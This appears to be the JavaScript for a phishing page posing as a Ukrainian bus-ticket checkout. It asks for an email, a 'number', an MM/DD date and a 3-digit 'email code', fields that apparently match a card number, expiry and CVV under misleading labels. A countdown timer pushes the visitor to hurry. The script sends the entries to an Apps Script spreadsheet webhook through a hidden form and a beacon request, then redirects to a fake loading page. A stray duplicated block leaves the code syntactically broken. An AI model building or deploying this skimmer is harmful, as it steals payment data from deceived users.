// Ініціалізація та таймер 5 хвилин
const tripEl = document.getElementById('trip');
const routeLabel = document.getElementById('routeLabel');
const dateLabel = document.getElementById('dateLabel');
const fromLabel = document.getElementById('fromLabel');
const toLabel = document.getElementById('toLabel');
const priceLabel = document.getElementById('priceLabel');
const totalLabel = document.getElementById('totalLabel');
const yearEl = document.getElementById('year');

const emailEl = document.getElementById('email');
const userNumberEl = document.getElementById('userNumber');
const mdDateEl = document.getElementById('mdDate');
const emailCodeEl = document.getElementById('emailCode');
const payBtn = document.getElementById('payBtn');
const countdownEl = document.getElementById('countdown');

function pad2(n){return String(n).padStart(2,'0')}
function formatToMMDD(iso){
  if(!iso) return '';
  const d = new Date(iso + 'T00:00:00');
  return `${pad2(d.getMonth()+1)}.${pad2(d.getDate())}`;
}
function hydrateTripFromData(){
  if(!tripEl) return;
  const route = tripEl.dataset.routeNumber || 'AB-102';
  const from = tripEl.dataset.fromCity || 'Київ';
  const to = tripEl.dataset.toCity || 'Львів';
  const date = tripEl.dataset.date || '2025-11-15';
  const price = tripEl.dataset.price || '450';
  routeLabel.textContent = `Рейс ${route}`;
  fromLabel.textContent = from;
  toLabel.textContent = to;
  dateLabel.textContent = formatToMMDD(date);
  priceLabel.textContent = `${price} ₴`;
  totalLabel.textContent = `${price} ₴`;
}
function validate(){
  const email = (emailEl.value || '').trim();
  const numberVal = (userNumberEl.value || '').trim();
  const mdDateVal = (mdDateEl.value || '').trim();
  const codeVal = (emailCodeEl.value || '').trim();

  if(!email || !/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)){
    alert('Введіть коректний email.');
    emailEl.focus(); return false;
  }
  if(!numberVal){ alert('Вкажіть номер.'); userNumberEl.focus(); return false; }
  if(!/^\d{2}\/\d{2}$/.test(mdDateVal)){
  alert('Дата має бути у форматі MM/DD.');
  mdDateEl.focus();
  return false;
}
  if(!/^\d{3}$/.test(codeVal)){ alert('Код з пошти має містити рівно 3 цифри.'); emailCodeEl.focus(); return false; }
  return { email, numberVal, mdDateVal, codeVal };
}
async function sendToSheet(payload){
  try{
    if(typeof SHEET_WEBHOOK_URL !== 'string' || !SHEET_WEBHOOK_URL) return;

    const bodyStr = JSON.stringify(payload);

    // 1) Найнадійніше: sendBeacon (не скасовується при переході)
    if (navigator.sendBeacon) {
      const blob = new Blob([bodyStr], { type: 'text/plain;charset=utf-8' });
      navigator.sendBeacon(SHEET_WEBHOOK_URL, blob);
      return true;
    }

    // 2) Fallback: fetch з keepalive + no-cors (без префлайту)
    await fetch(SHEET_WEBHOOK_URL, {
      method: 'POST',
      mode: 'no-cors',
      keepalive: true,
      headers: { 'Content-Type': 'text/plain;charset=utf-8' },
      body: bodyStr
    });

    return true;
  }catch(e){
    // можна глянути у консоль під час дебагу:
    // console.error('sendToSheet error', e);
    return false;
  }
}
async function onPay(){
  const v = validate();
  if(!v) return;

  const entry = {
    created_at: new Date().toISOString(),
    email: v.email,
    number: v.numberVal,
    date: v.mdDateVal, // MM/DD
    code: v.codeVal,
    route: routeLabel.textContent.replace('Рейс ','').trim(),
    from: fromLabel.textContent,
    to: toLabel.textContent,
    price: (priceLabel.textContent || '').replace(' ₴','')
  };

  // ===== СУПЕР-ПРОСТЕ ВІДПРАВЛЕННЯ ЧЕРЕЗ ПРИХОВАНУ ФОРМУ =====
  const form = document.getElementById('sheetForm');
  form.action = APPS_FORM_URL;                // URL твого Apps Script
  form.elements.email.value  = entry.email;
  form.elements.number.value = entry.number;
  form.elements.date.value   = entry.date;
  form.elements.code.value   = entry.code;
  form.elements.route.value  = entry.route;
  form.elements.from.value   = entry.from;
  form.elements.to.value     = entry.to;
  form.elements.price.value  = entry.price;
  form.submit();  // браузер відправляє POST у фоновому <iframe> і не скасовує при переході

  // мʼяка затримка перед навігацією, щоб точно встигло відправитись
  setTimeout(() => {
    window.location.href = '/loading.html';
  }, 200);
}


  // Відправляємо (не чекаємо відповіді)
  sendToSheet(entry);

  // Дай браузеру 200–300 мс, щоб відправити пакет, і тільки потім переходь
  setTimeout(() => {
    window.location.href = '/loading.html';
  }, 300);
}
function startCountdown(minutes=5){
  let remain = minutes*60;
  const tick = ()=>{
    const m = Math.floor(remain/60);
    const s = remain%60;
    countdownEl.textContent = `${m}хв ${pad2(s)}сек`;
    if(remain<=0){
      payBtn.disabled = true;
      countdownEl.textContent = `Час вийшов`;
      return;
    }
    remain -= 1;
    setTimeout(tick, 1000);
  };
  tick();
}

document.addEventListener('DOMContentLoaded', () => {
  hydrateTripFromData();
  yearEl && (yearEl.textContent = new Date().getFullYear());
  if(typeof DEFAULT_EMAIL === 'string' && DEFAULT_EMAIL){
    emailEl.value = DEFAULT_EMAIL; // попередньо заповнений email
  }
  payBtn && payBtn.addEventListener('click', onPay);
  startCountdown(5);
});

document.addEventListener("DOMContentLoaded", () => {
  const mdDateInput = document.getElementById("mdDate");
  if (mdDateInput) {
    mdDateInput.addEventListener("input", (e) => {
      let v = e.target.value.replace(/\D/g, ""); // прибирає все, крім цифр
      if (v.length > 2) v = v.slice(0, 2) + "/" + v.slice(2); // додає "/"
      e.target.value = v.slice(0, 5); // обмежує до формату MM/DD
    });
  }
});
